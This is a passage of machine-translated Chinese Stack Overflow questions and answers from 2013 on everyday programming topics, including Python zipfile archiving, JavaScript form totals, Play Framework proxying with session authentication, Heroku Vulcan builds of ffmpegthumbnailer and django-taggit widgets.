    lenDirPath = len(dirPath)
    for root, _ , files in os.walk(dirPath):
        for file in files:
            filePath = os.path.join(root, file)
            zipf.write(filePath , filePath[lenDirPath :] )
    zipf.close()
#end zipDir 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-04-18T20:02:51.827

我怀疑可能有一个更优雅的解决方案，但这个应该可以工作：

```
def add_zip_flat(zip, filename):
    dir, base_filename = os.path.split(filename)
    os.chdir(dir)
    zip.write(base_filename)

zip = zipfile.ZipFile(buffer, 'w')
add_zip_flat(zip, first_path)
add_zip_flat(zip, second_path)
zip.close() 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2020-05-11T07:48:20.493

您可以使用以下参数覆盖存档中的文件名`arcname`：

```
with zipfile.ZipFile(file="sample.zip", mode="w", compression=zipfile.ZIP_DEFLATED) as out_zip:
for f in Path.home().glob("**/*.txt"):
    out_zip.write(f, arcname=f.name) 
```

文档参考：[https ://docs.python.org/3/library/zipfile.html#zipfile.ZipFile.write](https://docs.python.org/3/library/zipfile.html#zipfile.ZipFile.write)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-10-17T13:01:22.557

也可以这样做（这允许创建大于 2GB 的档案）

```
import os, zipfile
def zipdir(path, ziph):
    """zipper"""
    for root, _, files in os.walk(path):
        for file_found in files:
            abs_path = root+'/'+file_found
            ziph.write(abs_path, file_found)
zipf = zipfile.ZipFile(DEST_FILE.zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True)
zipdir(SOURCE_DIR, zipf)
zipf.close() 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-01-01T16:48:06.977

正如[João Pinto](https://stackoverflow.com/users/401041/jo%C3%A3o-pinto)所说，`arcname`ZipFile.write 的参数就是您所需要的。此外，阅读[pathlib](https://docs.python.org/3.10/library/pathlib.html#pathlib.PurePath.relative_to)的文档也很有帮助。您也可以轻松地获得某些东西的相对路径`pathlib.Path.relative_to`，无需切换到`os.path`.

```
import zipfile
from pathlib import Path

folder_to_compress = Path("/path/to/folder")
path_to_archive = Path("/path/to/archive.zip")

with zipfile.ZipFile(
        path_to_archive,
        mode="w",
        compression=zipfile.ZIP_DEFLATED,
        compresslevel=7,
    ) as zip:
    for file in folder_to_compress.rglob("*"):
        relative_path = file.relative_to(folder_to_compress)
        print(f"Packing {file} as {relative_path}")
        zip.write(file, arcname=relative_path) 
```

# javascript - 如何通过表单提交 JavaScript 方程式的值？

> ID：16091905
> 
> 赞同：0
> 
> 时间：2013-04-18T19:54:30.200
> 
> 标签：javascript, forms

我有一个脚本，它根据表单添加所有项目，然后减去这些项目中最小的一个以创建一个新的总数。我希望能够以表格的形式返回结果。

JavaScript：

```
var prices = [];

function remove(arr,itm){
    var indx = arr.indexOf(itm);
    if (indx !== -1){
        arr.splice(indx,1);
    }
}

function calculateSectedDues(checkbox, amount) {
    if (checkbox.checked === true) {
        prices.push(amount);
    } else {
        remove(prices, amount);
    }

    var total = 0;
    for (var i = 0, len = prices.length; i < len; i++)
        total += prices[i];

    var min = prices.slice().sort(function(a,b){return a-b})[0];
    if(typeof min === 'undefined') min = 0;

    var withDiscount = total - min;
    var discountAmount = withDiscount - total;

    //document.grad_enroll_form.total.value = total;
    document.querySelector("#value").innerHTML = "Total: $"+total+'<br>';
    document.querySelector("#value").innerHTML += "Discount: $"+discountAmount+'<br>';
    document.querySelector("#value").innerHTML += "New total: $"+withDiscount+'<br>';
} 
```

HTML：

```
<label><input type="checkbox" onclick="calculateSectedDues(this,5)" name="Scarf"> <span>Scarf</span><label><br>
<label><input type="checkbox" onclick="calculateSectedDues(this,10)" name="Hat"> <span>Hat</span><label><br>
<label><input type="checkbox" onclick="calculateSectedDues(this,20)" name="Jacket"> <span>Jacket</span><label><br>

<span id="value">Total: $0<br>Discount: $0<br>New total: $0</span> 
```

您会注意到有 3 个不同的总数。我想通过表格提交的只是最终总数。该表单功能齐全且效果很好，我只想将这些结果包含在表单中。

＆这里是它的链接：

[http://jsfiddle.net/danielrbuchanan/yjrTZ/5/](http://jsfiddle.net/danielrbuchanan/yjrTZ/5/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:50:13.893

要回答您的评论（和问题）：

在您的表单中，添加一个字段`<input type="hidden" name="finalTotal">`
然后让您的函数`calculateSectedDues`以：`document.getElementById('finalTotal').value=withDiscount;`

它可能看起来像（稍微重构一下，看看我对“价值”做了什么）：

```
function calculateSectedDues(checkbox, amount) {
    if (checkbox.checked) {
        prices.push(amount);
    } else {
        remove(prices, amount);
    }

    var total = 0, i = 0, len = prices.length;
    for (; i < len; i++) {
        total += prices[i];
    }

    var min = prices.slice().sort(function(a,b){return a-b})[0];
    if(typeof min === 'undefined') min = 0;

    var withDiscount = total - min;
    var discountAmount = withDiscount - total;

    //document.grad_enroll_form.total.value = total;
    document.getElementById('value').innerHTML = "Total: $"+total+'<br>'
                                               + "Discount: $"+discountAmount+'<br>'
                                               + "New total: $"+withDiscount+'<br>';
    //set hidden input value
    document.getElementById('finalTotal').value = withDiscount; 
} 
```

提交此表单后，服务器收到的后期数据将包含一个名为“finalTotal”的值，其中包含“withDiscount”的值。

当涉及金钱时，千万不要在现实生活中这样做（尤其是信任）；任何人都可以发布他们想要的任何内容！

# jquery - 通过 jQuery 更改 CSS 文件

> ID：16091914
> 
> 赞同：0
> 
> 时间：2013-04-18T19:55:02.503
> 
> 标签：jquery, css, resize, window

我正在尝试使用[.resize()](http://api.jquery.com/resize/)使用 jQuery 更改页面上的 CSS 文件。

我花了几个小时试图弄清楚，现在我需要帮助。

```
$(document).ready(function(){
    $(window).resize(function(){
        var w = $(window).width();
        if(w < '640px')
        {
            $('#pcss').attr('href', 'css/pagestyle640.css');
        }
        else if(w > '640px')
        {
            $('#pcss').attr('href', 'css/pagestyle.css');
        }
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:00:27.813

请查看[jQuery API](http://api.jquery.com/width/)。.width 方法返回一个数字。我相信您在这里遇到了将数字与字符串进行比较的问题：

```
if(w < '640px') 
```

你会更好：

```
if(w < 640) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:10:05.020

您要使用的是[Media Queries](https://developer.mozilla.org/en-US/docs/CSS/Media_queries)。您可以在没有 javascript 行的情况下完成所有这些操作。

您可以添加样式表，例如：

```
<link rel="stylesheet" media="screen and (max-width: 640px)" /> 
```

这只会在屏幕窄于 640 像素时应用。

至于旧版浏览器支持，您可以使用这个 polyfill：[https](https://github.com/scottjehl/Respond) ://github.com/scottjehl/Respond 还有一个非常漂亮且简单的演示页面。

# matlab - 径向基函数

> ID：16091915
> 
> 赞同：2
> 
> 时间：2013-04-18T19:55:03.137
> 
> 标签：matlab, machine-learning

我正在尝试为回归制作一个简单的径向基函数网络（RBFN）。我有一个包含 600 多个样本的 20 维（特征）数据集。我需要最终网络为每个 20 维样本输出 1 个标量值。

注意：机器学习的新手......感觉我在这里错过了一个重要的概念。

使用感知器，我们可以训练一个线性网络，直到使用初始样本的一小部分子集将预测误差降至最低。

RBFN 是否有类似的流程？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T14:16:52.983

就在这里，

多层感知器和 RBFN 之间的两个主要区别是 RBFN 通常只意味着一层，并且激活函数是高斯函数而不是 sigmoid。

训练阶段可以使用误差损失函数的梯度下降来完成，因此实现起来相对简单。

请记住，RBFN 是 RBF 单元的线性组合，因此输出的范围是有限的，如果您需要超出该范围的标量，则需要对其进行转换。

您可以参考一些资源：

[PDF]（[http://scholar.lib.vt.edu/theses/available/etd-6197-223641/unrestricted/Ch3.pdf](http://scholar.lib.vt.edu/theses/available/etd-6197-223641/unrestricted/Ch3.pdf)）

[维基百科] ( [http://en.wikipedia.org/wiki/Radial_basis_function_network](http://en.wikipedia.org/wiki/Radial_basis_function_network) )

[Wolfram] ( [http://reference.wolfram.com/applications/neuralnetworks/NeuralNetworkTheory/2.5.2.html](http://reference.wolfram.com/applications/neuralnetworks/NeuralNetworkTheory/2.5.2.html) )

希望能帮助到你，

# gcc - 对 main 的随机未定义引用 - 有一个 main & 会自行消失而无需更改

> ID：16091917
> 
> 赞同：0
> 
> 时间：2013-04-18T19:55:10.407
> 
> 标签：gcc, cmake

每隔一段时间，用

```
/usr/lib/../lib64/crt1.o: In function `_start':
(.text+0x20): undefined reference to `main'
collect2: error: ld returned 1 exit status 
```

但是有一个主要的。这发生在构建版本 50+ 的程序上，并且主程序已经使用了几个月或几年。

最好的部分是，如果我再次运行 make，中间什么都不做，它编译得很好。

这是一个复杂的构建，数量级为 50,000 行代码，实际上无法简化为简单的测试用例。不值得花时间尝试诊断，因为只需重新运行 make 就可以了。但是，希望其他人以前遇到过这种随机的挫败感。

也许我在我的 CMakeLists.txt 文件中的某个地方犯了一个错误，这允许这种情况定期发生，但随后会消失大约 20 次构建。也许在 CMake 版本 2.6-patch 4、gcc 4.7.0 或 ld 2.17.50.0.6-20.el5_8.3 中存在一个罕见的错误，但我在实际上的程序员的大海捞针中没有找到任何其他提及遗漏了主要。在某个时候，我会更新 cmake 和 gcc ......

# php - PHP ARGB 转 Alpha-Hex 和 Alpha-Hex 转 ARGB

> ID：16091920
> 
> 赞同：0
> 
> 时间：2013-04-18T19:55:17.447
> 
> 标签：php, rgba

我得到了以下颜色`-16777216`，我想在 PHP 中将其转换为像这样的 alpha-hex 代码`00FFBBCC`。我也希望能够做相反的事情。我真的不知道从哪里开始，我的朋友 Google 没有给我答案。

任何人都可以帮忙吗？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:18:27.147

使用 dechex() 怎么样？

```
echo dechex(-16777216); 
```

它输出 ff000000

如果你想要大写字母，只需使用 strtoupper()：

```
echo strtoupper(dechex(-16777216)); //FF000000 
```

编辑：做相反，使用 hexdec() 而不是 dechex()

# single-page-application - SPA Web 应用程序中的树结构

> ID：16091923
> 
> 赞同：0
> 
> 时间：2013-04-18T19:55:24.560
> 
> 标签：single-page-application, hottowel

我正在启动一个单页应用程序，但仍然没有选择任何框架。它需要做的唯一复杂的事情是允许用户从树结构中为表单的一个字段选择一个元素。如果它可以同时使用鼠标选择和键盘自动完成功能，那就太好了。这棵树有 5 层深，包含大约 500 个元素。什么是实现这一点的好方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-28T13:52:31.283

这是一个向您展示如何递归构建树的小提琴：http: [//jsfiddle.net/KtbXb/](http://jsfiddle.net/KtbXb/)。

就输入而言，将点击函数绑定到每个节点将调用一个函数，该函数可以访问与点击节点关联的所有数据：

```
view:
<li data-bind="text: name, click: yourFunction"></li>

viewmodel: 
var yourFunction = function (data) {
//your function will have access to the node via data
}; 
```

对于键盘输入，您可以向视图添加输入并将值绑定到可观察值。从那里，您可能可以在线找到子字符串搜索算法，甚至是插件（jquery.table-filter 做得很好）

# python - 将变量“按名称”添加到本地命名空间

> ID：16091926
> 
> 赞同：0
> 
> 时间：2013-04-18T19:55:33.153
> 
> 标签：python, dictionary, namespaces, global, local

我知道我可以“按名称”向全局命名空间添加一个变量，例如：

```
def getNewVar(name,val):
    globals()[name]=val 
```

问题是，我想在*本地*命名空间中执行此操作。我已经尝试过使用`locals()`而不是失败`globals()`。可能有人想知道为什么我会做这样的事情。好的，在我的用例中，函数的参数实际上是一个字典，我想做类似的事情：

```
def processDictEntries(dict):
    for varname in dict.keys():
        locals()[varname]=dict[varname]  # won't work, of course 
```

这样，在函数的更下方，我不必继续输入

```
result1=dict['var1']+5.
result2=dict['var2']*dict['var7'] 
```

一遍又一遍地。我可以打字

```
result1=var1+5
result2=var2*var7 
```

而且，如果有一种方法可以像我写的那样在一个小循环中执行此操作，那么我不必这样做：

```
var1=dict['var1']
var2=dict['var2'] etc. 
```

任何一个。我真的只是在寻找代码的经济性；这是一本大字典。

顺便说一句，字典的条目永远不会改变；它是严格输入的。而且，是的，我知道如果输入字典缺少函数所需的变量之一，我会遇到麻烦，但我认为可以处理。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:00:31.473

如果您可以更改调用函数的方式：

```
def processDictEntries(var1=None,var2=None,**kwargs):
    #do stuff with var1,var2 ... 
```

然后调用函数为：

```
processDictEntries(**dict) 
```

当然，如果你不能这样做，你总是可以`processDictEntries`用作包装器：

```
def _processDictEntries(var1=None,var2=None,**kwargs):
    ...

def processDictEntries(d):
    return _processDictEntries(**d) 
```

* * *

^(作为旁注，命名变量不是一个好主意，`dict`因为然后你会隐藏内置函数)

# java - Play Framework - 带有会话身份验证的代理请求

> ID：16091929
> 
> 赞同：0
> 
> 时间：2013-04-18T19:55:48.267
> 
> 标签：java, authentication, proxy, playframework-2.0

我有一个沙发应用程序，我想通过 Play 控制对它的访问！在每个用户的基础上。我的计划是在端口 xxxx 上托管 couchapp，该端口只能在内部访问，并托管 Play！在 80 端口上。

在 Apache 我会这样做，

```
ProxyPass /couchapp http://localhost:xxxx
ProxyPassReverse /couchapp http://localhost:xxxx 
```

但是这种方法没有身份验证。我看到了播放！有一些代理功能，但无论如何我都看不到要为此添加用户身份验证，[http://www.playframework.com/documentation/2.0/HTTPServer](http://www.playframework.com/documentation/2.0/HTTPServer)

知道如何将用户身份验证添加到 Play！代理人？代码看起来像这样。

```
// Routes all request to http://localhost:xxxx/ if authenticated
public static Result useProxy() {
    if (!session("authorized").equals("true")) {
        String pingURL = "";
        return redirect(pingURL); // will call pingCallback after login
    }
    return ok(); // take the original request to /couchapp/xxxx.asset and proxy it to http://localhost:xxxx/xxxx.asset
}

public static Result pingCallback() {
    Form<PingResponse> pingResponseForm = Form.form(PingResponse.class);
    PingResponse pingResponse = pingResponseForm.bindFromRequest().get();
    if (!pingResponse.isAuthorized()) {
        return unauthorized();
    } else {
        session("authorized", "true");
    }
    return ok(); // take the original request to /couchapp/xxxx.asset and proxy it to http://localhost:xxxx/xxxx.asset
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:59:22.047

您是否尝试过添加：

```
-Dhttp.proxyUser=username -Dhttp.proxyPassword=password 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T22:23:08.663

我使用 play.libs.WS 务实地进行代理调用。这是代码。目前，每次通话都会丢失会话，但这是一个不同的问题。

-编辑 - 会话丢失是因为 fav.ico 没有随它一起发送的 cookie，而 Play 依赖于会话的 cookie。我为此添加了一个检查，但最好在路由文件中将其过滤掉。

```
package controllers;

import models.PingResponse;
import play.data.Form;
import play.libs.F;
import play.mvc.Controller;
import play.mvc.Result;
import play.libs.WS;

public class Ping extends Controller {
    final static String playProxyURL = "http://localhost:9000/"; // pretend this is our proxy domain(should be on port 80)
    final static String couchAppURL = "http://localhost:80/couchappTest/"; // pretend this is our internal secure site
    final static String pingURL = "http://localhost:80/pingTest/"; // pretend this is ping endpoint

    public static Result init() {
        return Ping.useProxy("");
    }

    public static Result useProxy(String assetPath) {

        // request for favicon.ico doesn't include cookie :(
        if (assetPath.equals("favicon.ico")) {
            return ok();
        }
        if (session("authorized") == null || !session("authorized").equals("true")) {
            System.out.println("not auth");
            return redirect(pingURL);
        } else {
            return async(
                    WS.url(couchAppURL + assetPath).get().map(
                            new F.Function<WS.Response, Result>() {
                                public Result apply(WS.Response response) {
                                    return ok(response.getBody()).as(response.getHeader("Content-type"));
                                }
                            }
                    )
            );
        }
    }

    public static Result pingCallbackGET(String token, String httpRef) {
        if (token == null || token.equals("")) {
            return unauthorized();
        } else {
            System.out.println("auth");
            session("authorized", "true");
            session("token", token);
        }
        return redirect(playProxyURL + httpRef);
    }
} 
```

# android - Android 仅下载在 Horizo ntalScrollView 中可见的图像

> ID：16091932
> 
> 赞同：6
> 
> 时间：2013-04-18T19:55:58.393
> 
> 标签：android, performance, horizontalscrollview

我有一个 Horizo​​ntalScrollView，其中包含一个 LinearLayout 来保存我的所有视图。我在 LinearLayout 中添加了大约 20 个包含 ImageView 和 TextView 的 RelativeLayout。如果 ImageView 在屏幕上（当我滚动到 ImageView 时），我只想加载图像。

我尝试按照[这篇文章](https://stackoverflow.com/questions/4628800/android-how-to-check-if-a-view-inside-of-scrollview-is-visible)在缩略图上使用`getHitRect()`, 但是，缩略图的 Rect（边界）始终为 0、0-0、0，导致我的方法返回 false。我究竟做错了什么？

`thumbnailLayout`是我在 Horizo​​ntalScrollView 内的 LinearLayout 是我的 Horizo
`thumbnailScroll`​​ntalScrollView

```
runOnUiThread(new Runnable() {

    @Override
    public void run() {
           Log.e(TAG, "running");
           for (int i = 0; i < thumbnailLayout.getChildCount(); i++) {
                RelativeLayout view = (RelativeLayout) thumbnailLayout.getChildAt(i);
                ImageView thumbnail = (ImageView) view.findViewById(R.id.thumbnail);
                if (thumbnailIsOnScreen(thumbnail)) {
                    Log.e(TAG, items.get(i).getTitle() + " has downloaded");
                    app.setImage(items.get(i).getThumbnailSmall(), thumbnail);
                }
           }

       }
   });

private boolean thumbnailIsOnScreen(ImageView thumbnail) {
        Rect bounds = new Rect();
        thumbnail.getHitRect(bounds);

        Rect scrollBounds = new Rect(thumbnailScroll.getScrollX(), thumbnailScroll.getScrollY(),
                thumbnailScroll.getScrollX() + thumbnailScroll.getWidth(), thumbnailScroll.getScrollY()
                        + thumbnailScroll.getHeight());
        return Rect.intersects(scrollBounds, bounds);
    } 
```

编辑我正在使用 TreeObserver 并发现我检查缩略图是否在屏幕上的方法是错误的。它仍然抓取所有图像，并不断循环（因为我使用的是 onPreDrawListener？）

```
thumbnailLayout.getViewTreeObserver().addOnPreDrawListener(new OnPreDrawListener() {

            @Override
            public boolean onPreDraw() {
                Log.e(TAG, "running");

                for (int i = 0; i < thumbnailLayout.getChildCount(); i++) {
                    RelativeLayout view = (RelativeLayout) thumbnailLayout.getChildAt(i);
                    ImageView thumbnail = (ImageView) view.findViewById(R.id.thumbnail);
                    if (thumbnailIsOnScreen(thumbnail)) {
                        Log.e(TAG, items.get(i).getTitle() + " has downloaded");
                        app.setImage(items.get(i).getThumbnailSmall(), thumbnail);
                    }
                }
                return true;
            }
        }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-28T19:28:50.533

您需要一个 ListView，但 android 中没有原生的 Horizo​​ntallListView。你可以试试[DevSmart 的 Horizo​​ntallListView](http://www.dev-smart.com/archives/34)。它的工作方式类似于原生列表视图，如果需要，可以使用适配器和自定义视图。

Yo lo estoy utilizando en mi proyecto por la misma razón que tu, para cargar solo las imagenes visibles，所以我希望这可以帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-29T09:33:31.453

您是否考虑过使用 ViewPager？ [http://developer.android.com/reference/android/support/v4/view/ViewPager.html](http://developer.android.com/reference/android/support/v4/view/ViewPager.html)

如果这不适合您的设计，您需要覆盖 ScrollView -> 函数 onScrollChanged 并检查屏幕中的图像是否检查图像（左？）位置与滚动位置相比。

# ruby-on-rails-3 - 使用 Heroku Vulcan 构建具有依赖关系的库

> ID：16091934
> 
> 赞同：1
> 
> 时间：2013-04-18T19:56:03.090
> 
> 标签：ruby-on-rails-3, heroku, build-process

**任务**：构建一个[ffmpegthumbnailer](http://code.google.com/p/ffmpegthumbnailer/)，可以通过 Rails 应用程序销售并部署到 Heroku 的 Cedar 堆栈。

到目前为止的过程：

1.  [成功] 使用[Vulcan](https://github.com/heroku/vulcan)构建 ffmpeg （使用[本指南](https://gist.github.com/coopermaruyama/3963576)）并上传到 S3
2.  [失败] 使用 ffmpeg 作为依赖项构建 ffmpegthumbnailer。

使用命令：

```
$ vulcan build -v -s ffmpegthumbnailer-2.0.8 -d http://s3.amazonaws.com/remoting-io-cdn/heroku-building-lib/ffmpeg 
```

我得到以下信息（请参阅底部的错误）：

```
Packaging local directory... done
Uploading source package... done
Building with: ./configure --prefix /app/vendor/ffmpegthumbnailer-2.0 && make install
downloading http://s3.amazonaws.com/remoting-io-cdn/heroku-building-lib/ffmpeg
checking for a BSD-compatible install... /usr/bin/install -c
checking whether build environment is sane... yes
checking for a thread-safe mkdir -p... /bin/mkdir -p
checking for gawk... no
checking for mawk... mawk
checking whether make sets $(MAKE)... yes
checking for g++... g++
checking whether the C++ compiler works... yes
checking for C++ compiler default output file name... a.out
checking for suffix of executables... 
checking whether we are cross compiling... no
checking for suffix of object files... o
checking whether we are using the GNU C++ compiler... yes
checking whether g++ accepts -g... yes
checking for style of include used by make... GNU
checking dependency style of g++... gcc3
checking build system type... x86_64-unknown-linux-gnu
checking host system type... x86_64-unknown-linux-gnu
checking how to print strings... printf
checking for gcc... gcc
checking whether we are using the GNU C compiler... yes
checking whether gcc accepts -g... yes
checking for gcc option to accept ISO C89... none needed
checking dependency style of gcc... gcc3
checking for a sed that does not truncate output... /bin/sed
checking for grep that handles long lines and -e... /bin/grep
checking for egrep... /bin/grep -E
checking for fgrep... /bin/grep -F
checking for ld used by gcc... /usr/bin/ld
checking if the linker (/usr/bin/ld) is GNU ld... yes
checking for BSD- or MS-compatible name lister (nm)... /usr/bin/nm -B
checking the name lister (/usr/bin/nm -B) interface... BSD nm
checking whether ln -s works... yes
checking the maximum length of command line arguments... 1572864
checking whether the shell understands some XSI constructs... yes
checking whether the shell understands "+="... yes
checking how to convert x86_64-unknown-linux-gnu file names to x86_64-unknown-linux-gnu format... func_convert_file_noop
checking how to convert x86_64-unknown-linux-gnu file names to toolchain format... func_convert_file_noop
checking for /usr/bin/ld option to reload object files... -r
checking for objdump... objdump
checking how to recognize dependent libraries... pass_all
checking for dlltool... no
checking how to associate runtime and link libraries... printf %s\n
checking for ar... ar
checking for archiver @FILE support... @
checking for strip... strip
checking for ranlib... ranlib
checking command to parse /usr/bin/nm -B output from gcc object... ok
checking for sysroot... no
checking for mt... mt
checking if mt is a manifest tool... no
checking how to run the C preprocessor... gcc -E
checking for ANSI C header files... yes
checking for sys/types.h... yes
checking for sys/stat.h... yes
checking for stdlib.h... yes
checking for string.h... yes
checking for memory.h... yes
checking for strings.h... yes
checking for inttypes.h... yes
checking for stdint.h... yes
checking for unistd.h... yes
checking for dlfcn.h... yes
checking for objdir... .libs
checking if gcc supports -fno-rtti -fno-exceptions... no
checking for gcc option to produce PIC... -fPIC -DPIC
checking if gcc PIC flag -fPIC -DPIC works... yes
checking if gcc static flag -static works... yes
checking if gcc supports -c -o file.o... yes
checking if gcc supports -c -o file.o... (cached) yes
checking whether the gcc linker (/usr/bin/ld -m elf_x86_64) supports shared libraries... yes
checking whether -lc should be explicitly linked in... no
checking dynamic linker characteristics... GNU/Linux ld.so
checking how to hardcode library paths into programs... immediate
checking whether stripping libraries is possible... yes
checking if libtool supports shared libraries... yes
checking whether to build shared libraries... yes
checking whether to build static libraries... yes
checking how to run the C++ preprocessor... g++ -E
checking for ld used by g++... /usr/bin/ld -m elf_x86_64
checking if the linker (/usr/bin/ld -m elf_x86_64) is GNU ld... yes
checking whether the g++ linker (/usr/bin/ld -m elf_x86_64) supports shared libraries... yes
checking for g++ option to produce PIC... -fPIC -DPIC
checking if g++ PIC flag -fPIC -DPIC works... yes
checking if g++ static flag -static works... yes
checking if g++ supports -c -o file.o... yes
checking if g++ supports -c -o file.o... (cached) yes
checking whether the g++ linker (/usr/bin/ld -m elf_x86_64) supports shared libraries... yes
checking dynamic linker characteristics... (cached) GNU/Linux ld.so
checking how to hardcode library paths into programs... immediate
checking for special C compiler options needed for large files... no
checking for _FILE_OFFSET_BITS value needed for large files... no
checking whether make supports nested variables... yes
checking for ANSI C header files... (cached) yes
checking for inttypes.h... (cached) yes
checking for sys/stat.h... (cached) yes
checking whether /usr/bin/ld -m elf_x86_64 accepts --as-needed... yes
checking for pkg-config... /usr/bin/pkg-config
checking pkg-config is at least version 0.9.0... yes
checking for FFMPEG... no
configure: error: Package requirements (libavutil libavformat libavcodec >= 52.26.0 libswscale) were not met:

No package 'libavutil' found
No package 'libavformat' found
No package 'libavcodec' found
No package 'libswscale' found

Consider adjusting the PKG_CONFIG_PATH environment variable if you
installed software in a non-standard prefix.

Alternatively, you may set the environment variables FFMPEG_CFLAGS
and FFMPEG_LIBS to avoid the need to call pkg-config.
See the pkg-config man page for more details.
bin/vulcan-make:69:in `chdir': No such file or directory - /app/vendor/ffmpegthumbnailer-2.0 (Errno::ENOENT)
    from bin/vulcan-make:69:in `block (2 levels) in <main>'
    from bin/vulcan-make:18:in `chdir'
    from bin/vulcan-make:18:in `block in <main>'
    from /usr/local/lib/ruby/1.9.1/tmpdir.rb:83:in `mktmpdir'
    from bin/vulcan-make:17:in `<main>'
>> Downloading build artifacts to: /tmp/ffmpegthumbnailer-2.0.tgz
   (available at http://remoting-io-lib-builder.herokuapp.com/output/e25f3591-ce65-433d-a45a-15bd7ea36109) 
```

该错误消息是什么意思？我应该怎么做才能正确编译它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-23T11:03:35.263

ffmpeg 和 ffmpegthumbnailer 可以按照[此处解释的步骤使用 Vulcan 构建](https://github.com/JonasNielsen/ffmpegthumbnailer#how-to-compile-libs)

此处提供了带有供应商 ffmpeg 和 ffmpegthumbnailer 的示例应用程序：[https](https://github.com/JonasNielsen/ffmpegthumbnailer) ://github.com/JonasNielsen/ffmpegthumbnailer查看自述文件中的 Heroku 配置说明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T00:34:37.407

你有几个问题

1.  您需要先构建它的依赖项（libavutil、libavformat、libavcodec、libswscale）
2.  您下载的东西实际上不是构建（构建从未发生过，它在配置时失败）它只是所取得的进展中的*工件*。
3.  [在可重用性方面，我在使用hammer ( https://github.com/hone/hammer](https://github.com/hone/hammer) ) 方面取得了更大的成功，然后是 vulcan。

要解决这个问题，您将需要对每个依赖项执行相同的过程，然后在您的构建脚本中将它们从 s3 提取它们并确保它们在您的路径或 lib 目录中。

我还发现`heroku run bash`在破解这些东西时这是非常宝贵的，因为它可以让你更多地修补你的环境。

# django - 编辑表单中的 Django-Taggit

> ID：16091940
> 
> 赞同：7
> 
> 时间：2013-04-18T19:56:35.643
> 
> 标签：django, django-taggit

这是一个模型类

```
class ModelName(models.Model):
  (...)
  pasta = TaggableManager(verbose_name=u'Pasta') 
```

和一个表单模板（正常 :P ）

{{form.as_p}}

我想让一切都非常干净和有用。但结果是一个 TaggedItem 对象列表：（：

```
[<TaggedItem: id: 2 tagged with general >, <TaggedItem: id: 3  tagged with outer >] 
```

![](https://i.stack.imgur.com/d1KKe.png)

而不是像

```
general, outer 
```

在 Django 中如何时尚？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-09-26T06:49:05.693

查看以下代码：[https](https://github.com/alex/django-taggit/blob/master/taggit/forms.py) ://github.com/alex/django-taggit/blob/master/taggit/forms.py 。您将找到用于呈现标签的小部件。您可以使用它来正确渲染它们。

例子：

模型.py

```
from django.db import models
from taggit.managers import TaggableManager

class Example(models.Model):
    name = models.CharField(max_length=20)    
    tags = TaggableManager() 
```

表格.py

```
.models import Example
from django import forms
from taggit.forms import TagWidget

class ExampleForm(forms.ModelForm):

    class Meta:
        model = Example
        fields = ('name', 'tags',)
        widgets = {
            'tags': TagWidget(),
        } 
```

我建议你也检查这个答案。 [django - django-taggit 表单](https://stackoverflow.com/questions/5359714/django-django-taggit-form)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-10-01T12:57:41.443

我会使用[django-taggit-autosuggest](https://bitbucket.org/fabian/django-taggit-autosuggest/overview)，因为它为用户提供了更好的 UI。

# javascript - 带有母版页的asp.net页面中选择控件（下拉列表）的jquery自动完成

> ID：16091943
> 
> 赞同：0
> 
> 时间：2013-04-18T19:56:42.443
> 
> 标签：javascript, jquery, asp.net, drop-down-menu, autocomplete

我在以母版页为父级的 .aspx（Web 表单）页面中遇到 jquery 自动完成功能的问题。在普通的 aspx 页面中，我可以使用自动完成功能根据需要呈现下拉列表，但是当我在母版页下的子页面中执行相同操作时，只会出现正常的下拉列表。所以这就是我所拥有的。这个在渲染时看起来不错，并且工作正常（没有母版页的普通 aspx 页面）：

```
 <select name="select" runat="server" id="select2" class="nostyle" style="width:100%;" placeholder="Select state">
<option></option>`                                                                                                                                                                                                      
</select> 
```

这个，作为母版页中子页面的一部分，工作方式不同：

```
 <select name="select2" runat="server" id="select2" class="nostyle" style="width:100%;" placeholder="Select state">
                                                               <option></option>                                                           
                                                               <option value="AK">Alaska</option>
                                                               <option value="HI">Hawaii</option>                                                                                               
   <option value="CA">California</option>
    <option value="NV">Nevada</option>
    <option value="OR">Oregon</option>
    <option value="WA">Washington</option>                                                              
    </select> 
```

自动完成的 JS 可以在这个链接中找到：http: [//jsfiddle.net/laziale/JjVHU/](http://jsfiddle.net/laziale/JjVHU/)

我的问题是为什么下拉自动完成功能在没有母版页的页面上起作用，而带有母版页的页面不起作用，尽管所有 js 文件都正确连接。提前致谢， Laziale

# c# - WPF 应用程序 OnStartup 中 System.IO.FileLoadException 的原因

> ID：16091944
> 
> 赞同：6
> 
> 时间：2013-04-18T19:56:45.297
> 
> 标签：c#, .net, wpf, debugging, fileloadexception

**我正在调试一个 WPF 应用程序，该应用程序在启动时因未处理的 System.IO.FileLoadException 而崩溃。**

我使用[程序集绑定日志查看器](http://msdn.microsoft.com/en-us/library/e74a18c4%28v=vs.71%29.aspx)来验证没有程序集加载错误，并且 OnStartup 覆盖中的所有代码都包含在 try catch 中。

***排除了Assembly binding 作为异常的原因，我应该调查哪些其他可能的原因？***

以下是相关的事件日志条目：

* * *

*源“ApplicationError”的第一个错误*

```
Faulting application name: CompanyProductManager.exe, version: 4.2.0.0, time stamp: 0x514a20ba
Faulting module name: KERNELBASE.dll, version: 6.1.7601.18015, time stamp: 0x50b8479b
Exception code: 0xe0434352
Fault offset: 0x0000000000009e5d
